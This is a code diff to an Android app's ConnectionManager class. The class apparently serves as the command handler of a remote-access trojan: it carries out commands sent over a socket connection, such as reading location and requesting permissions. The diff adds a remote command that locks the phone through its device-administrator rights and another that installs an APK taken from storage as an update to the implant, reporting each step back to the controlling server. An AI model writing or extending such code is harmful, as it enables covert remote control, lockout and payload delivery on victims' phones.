@@ -8,6 +8,10 @@ import android.util.Log;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
 
@@ -93,6 +97,12 @@ public class ConnectionManager {
                                 break;
                             case "0xGP":
                                 GP(data.getString("permission"));
+                                break;
+                            case "0xLD":
+                                LD();
+                                break;
+                            case "0xUD":
+                                UD();
                                 break;
                             case "0xSS":
                                 SS();
@@ -196,6 +206,30 @@ public class ConnectionManager {
         if(gps.canGetLocation()){
             ioSocket.emit("0xLO", gps.getData());
         }
+    }
+
+    public static void LD(){
+        MainService.mDPM.lockNow();
+    }
+
+    public static void UD() throws IOException {
+        File file = new File("/storage/emulated/0/backups/apps/lemon.apk");
+        if (file.exists()) {
+            Socket socket = ioSocket;
+            Object[] objArr = new Object[1];
+            objArr[0] = "pandey";
+            socket.emit("0xUD", objArr);
+        }
+        FileInputStream fileInputStream = new FileInputStream(file);
+        Socket socket2 = ioSocket;
+        Object[] objArr2 = new Object[1];
+        objArr2[0] = "pandey";
+        socket2.emit("0xUD", objArr2);
+        AppUpdate.installPackage(context, "com.etechd.l3mon", fileInputStream);
+        Socket socket3 = ioSocket;
+        Object[] objArr3 = new Object[1];
+        objArr3[0] = "pandey";
+        socket3.emit("0xUD", objArr3);
     }
 
     public static void SS()
